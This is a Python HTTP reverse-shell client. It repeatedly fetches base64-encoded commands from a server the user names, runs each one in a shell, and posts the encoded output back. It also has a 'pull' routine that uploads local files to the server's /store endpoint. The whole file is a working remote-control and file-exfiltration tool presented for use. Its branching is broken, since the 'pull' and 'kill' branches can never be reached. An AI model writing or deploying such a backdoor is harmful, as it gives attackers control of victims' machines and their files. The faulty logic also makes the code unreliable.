# This program establishes a client-server connection and executes base64 encoded commands received from the server.

import requests
import subprocess
import time
import os
import base64
import datetime

# User input for host
host = input("Enter the server IP (default: 127.0.0.1): ") or '127.0.0.1'
# User input for port
port = input("Enter the port (default: 80): ") or 80

while True:
    # Get command from the host
    req = requests.get(f"http://{host}:{port}")
    commandx = req.text
   
    # Decode base64 encoded command received from the server
    base64_bytes = commandx.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    command = message_bytes.decode('ascii')

    print("Decoded base64 server command:", command)

    if command:
        # If the command is not empty, execute it in the shell and send the output back to the host
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = CMD.stdout.read() + CMD.stderr.read()
        output = base64.b64encode(output).decode('ascii')
        print("Client base64 Encoded: ", output)
        
        response = output

        post_response = requests.post(url=f"http://{host}:{port}", data=response)

        # Sleep for 3 seconds before executing the next command
        time.sleep(3)

        # Get the current datetime
        current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(current_datetime, post_response)

    elif 'pull' in command:
        # If the command is 'pull', retrieve the file path and send the file back to the host if it exists
        pull, path = command.split(' ')
        if os.path.exists(path):
            url = f"http://{host}:{port}/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=f"http://{host}:{port}", data='[-] Not able to find the file!')
    else:
        # If the command is 'kill', break the loop and stop the client
        break
